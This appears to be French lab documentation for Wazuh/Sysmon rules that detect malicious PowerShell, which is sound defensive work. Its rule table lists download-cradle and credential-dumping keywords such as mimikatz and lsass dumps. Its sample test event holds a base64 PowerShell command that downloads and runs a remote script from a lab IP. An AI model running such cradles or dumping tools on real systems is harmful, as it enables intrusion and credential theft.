# SOC-001 — Documentation de détection : Suspicious PowerShell Activity

## 1. Objectif
Détecter les motifs PowerShell offensifs courants sur les endpoints Windows au moment
de la création de processus : commandes encodées, exécution en fenêtre masquée,
contournement de politique d'exécution, download cradles, chargement par réflexion,
mots-clés de dump d'identifiants, PowerShell lancé depuis Office et rafales automatisées.
La détection repose sur la ligne de commande (Sysmon Event 1), fiable même quand le
contenu du script n'est pas journalisé.

## 2. Flux de données
```
powershell.exe (attaquant/script)
        │  crée un processus
        ▼
Pilote Sysmon (Event 1: ProcessCreate) ──► canal Microsoft-Windows-Sysmon/Operational
        │
        ▼
Agent Wazuh Windows (localfile eventchannel) ──► TCP/1514
        │
        ▼
Manager Wazuh → décodeur sysmon (win.eventdata.*) → règles 100001-100009
        │
        ▼
Alerte (niveau 3-13) ──► dashboard Wazuh / API / intégrations
```

## 3. Composants et versions (baseline du lab)
| Composant | Version / note |
|-----------|----------------|
| Endpoint | VM lab Windows 10/11 (isolée) |
| Sysmon | v13+ (config schéma 4.90 ; testé avec 15.x) |
| Agent Wazuh | 4.x, service `Wazuh` |
| Manager Wazuh | 4.x, déploiement lab mono-nœud |

## 4. Configuration de la collecte
1. Installer Sysmon avec `config/sysmon-config.xml` (Event 1 + Event 22 uniquement).
2. Ajouter le bloc localfile `ossec-agent-sysmon.conf` dans `ossec.conf` de l'agent
   puis redémarrer : `Restart-Service -Name Wazuh`.
3. Confirmer la réception : `Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 5`.

## 5. Référence des règles
| Rule ID | Niveau | Condition déclenchante (ligne de commande Event 1) | MITRE | Justification |
|---------|--------|----------------------------------------------------|-------|---------------|
| 100001 | 3 | Image est powershell.exe / pwsh.exe | T1059.001 | Base de contexte ; permet le chaînage |
| 100002 | 12 | `-enc/-enco/-EncodedCommand <base64>` ou `FromBase64String` | T1059.001, T1027, T1140 | Encodage de payload standard anti-AV |
| 100003 | 8 | `-WindowStyle Hidden` / `-w hidden` | T1564.003 | Masque l'UI de l'attaquant ; abusé par les droppers |
| 100004 | 8 | `-ExecutionPolicy Bypass/Unrestricted` | T1059.001, T1562.001 | Outrepasse la politique hôte par défaut |
| 100005 | 12 | IEX / WebClient.DownloadString / IWR / BITS / HttpClient | T1059.001, T1105 | Download cradle en mémoire |
| 100006 | 10 | `[Reflection.Assembly]`, Add-Type, `.Load(`, LoadFrom, UnsafeGetString | T1059.001, T1140 | Chargement .NET en mémoire / désuffixation |
| 100007 | 13 | mimikatz, Invoke-Mimikatz, sekurlsa, dumpcred, comsvcs, minidump, lsass -dump | T1059.001, T1003.001 | Outillage de dump d'identifiants |
| 100008 | 12 | 8+ créations PowerShell par un agent en 120 s (corrélation) | T1059.001 | Staging de payload automatisé / boucles de droppers |
| 100009 | 13 | Parent est winword/excel/powerpnt/outlook/msaccess | T1059.001, T1204.002 | Chaîne d'attaque macro → PowerShell |

Niveaux : 3 = informatif, 8 = à examiner, 10 = élevé, 12 = critique, 13 = critique (priorité haute).

## 6. Vérification (sans agent)
Sur le manager, valider le décodage et le match de règle avec `wazuh-logtest` :

```bash
sudo /var/ossec/bin/wazuh-logtest
```

Coller un événement Sysmon Event 1 d'exemple (JSON) :

```json
{"Event":{"System":{"Provider":{"Name":"Microsoft-Windows-Sysmon"},"EventID":1,
"Computer":"SOC-WIN10","TimeCreated":{"SystemTime":"2026-08-08T10:15:30.123Z"},
"EventRecordID":98765},"EventData":{
"UtcTime":"2026-08-08 10:15:30.123","ProcessGuid":"{a1b2c3d4-0000-0000-0000-000000000000}",
"ProcessId":1234,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
"CommandLine":"powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADoAOAAwAC8AYwBhAGwAYwAuAHAAcwAxACcAKQA='",
"User":"SOC-WIN10\\analyst","ParentImage":"C:\\Windows\\explorer.exe",
"Hashes":"SHA256=0000000000000000000000000000000000000000000000000000000000000000"}}}
```

Résultat attendu : décodeur `sysmon`, puis **100001** (niveau 3) suivi de **100002** (niveau 12, commande encodée).

## 7. Test de bout en bout
Exécuter `scripts/simulate-suspicious-powershell.ps1` sur l'endpoint du lab, puis
interroger le dashboard : `rule.id:10000*`. La séquence d'alertes attendue par
simulation est documentée dans l'en-tête du script.

## 8. Champs d'alerte observables
- `agent.name` — nom de l'endpoint
- `data.win.system.eventID` — 1 (Sysmon Event 1)
- `data.win.eventdata.image` / `commandLine` / `parentImage` / `parentCommandLine` / `user` / `hashes`
- `rule.id` / `rule.level` / `rule.mitre.id`

## 9. Tuning et maintenance
- Examiner les règles tous les 90 jours face au volume réel d'alertes (voir `04-false-positives.md`).
- Étendre les motifs avec prudence : de nouvelles syntaxes attaquantes (variantes `-enc`,
  `pwsh -f`, `-sta`, contrôles `$PSVersionTable`) peuvent être ajoutées en règles enfants
  sans toucher la règle de base.
- Garder des niveaux cohérents avec vos SLA SOC (niveau ≥ 10 = revue analyste, ≥ 12 = immédiat).
